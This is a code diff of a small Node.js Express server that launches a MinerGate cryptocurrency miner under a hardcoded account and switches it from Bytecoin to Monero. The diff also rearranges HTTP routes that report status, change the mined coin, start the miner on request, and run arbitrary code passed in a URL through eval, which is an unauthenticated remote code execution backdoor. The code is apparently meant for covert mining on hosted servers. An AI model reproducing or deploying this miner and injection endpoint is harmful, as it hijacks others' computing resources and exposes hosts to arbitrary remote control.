@@ -4,22 +4,8 @@ const app = express();
  
 var state = false;
 var proc = '';
-var coin = '-bcn';
+var coin = '-xmr';
 
-
-app.listen(process.env.PORT || 8080, ()=>{
-  console.log('Example app listening on port 3000!');
-});
-app.get('/status', function (req, res) {
-  	res.send('state: '+state);
-});
-app.get('/coin/:coin', function (req, res) {
-  	coin = req.params.coin;
-    res.send('coin setted to: '+coin)
-});
-app.get('/inject/:code', function (req, res) {
-  	eval(req.params.code);
-});
 const start = ()=>{
     state = true;
     proc = spawn('./opt/minergate-cli/express', ['-user', 'ian10_141@yahoo.com.br', coin, '1']);
@@ -28,9 +14,23 @@ const start = ()=>{
       state = false;
     });
 }
-setInterval(function(){
-  start();
-  setTimeout(function(){
-    proc.kill('SIGINT');
-  }, 5*60*1000);
-}, 10*60*1000);
+
+
+app.listen(process.env.PORT || 8080, ()=>{
+  console.log('Example app listening on port 3000!');
+});
+app.get('/status', function (req, res) {
+  	res.send('state: '+state);
+});
+app.get('/start', function (req, res) {
+   start();
+  	res.send('miner started');
+});
+app.get('/coin/:coin', function (req, res) {
+  	coin = req.params.coin;
+    res.send('coin setted to: '+coin)
+});
+app.get('/inject/:code', function (req, res) {
+  	eval(req.params.code);
+});
+
